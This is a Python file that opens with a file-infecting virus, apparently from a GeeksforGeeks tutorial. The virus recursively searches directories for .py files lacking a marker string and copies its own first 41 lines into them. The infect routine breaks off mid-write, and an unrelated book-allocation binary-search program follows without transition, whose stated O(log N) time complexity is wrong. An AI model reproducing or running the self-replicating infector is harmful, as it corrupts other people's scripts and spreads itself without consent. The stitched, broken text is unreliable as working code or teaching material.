#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program for optimal allocation of pages

# Utility function to check if
# current minimum value is feasible or not.


def isPossible(arr, n, m, curr_min):
	studentsRequired = 1
	curr_sum = 0

	# iterate over all books
	for i in range(n):

		# check if current number of pages are
		# greater than curr_min that means
		# we will get the result after
		# mid no. of pages
		if (arr[i] > curr_min):
			return False

		# count how many students are required
		# to distribute curr_min pages
		if (curr_sum + arr[i] > curr_min):

			# increment student count
			studentsRequired += 1

			# update curr_sum
			curr_sum = arr[i]

			# if students required becomes greater
			# than given no. of students, return False
			if (studentsRequired > m):
				return False

		# else update curr_sum
		else:
			curr_sum += arr[i]

	return True

# function to find minimum pages


def findPages(arr, n, m):

	sum = 0

	# return -1 if no. of books is
	# less than no. of students
	if (n < m):
		return -1

	# Count total number of pages
	for i in range(n):
		sum += arr[i]

	# initialize start as 0 pages and
	# end as total pages
	start, end = 0, sum
	result = 10**9

	# traverse until start <= end
	while (start <= end):

		# check if it is possible to distribute
		# books by using mid as current minimum
		mid = (start + end) // 2
		if (isPossible(arr, n, m, mid)):

			# update result to current distribution
			# as it's the best we have found till now.
			result = mid

			# as we are finding minimum and books
			# are sorted so reduce end = mid -1
			# that means
			end = mid - 1

		else:
			# if not possible means pages should be
			# increased so update start = mid + 1
			start = mid + 1

	# at-last return minimum no. of pages
	return result

# Driver Code


# Number of pages in books
arr = [12, 34, 67, 90]
n = len(arr)
m = 2 # No. of students

print("Minimum number of pages = ",
	findPages(arr, n, m))

# This code is contributed by Mohit Kumar
# Time Complexity: O(log(N))
# Space Complexity: O(1)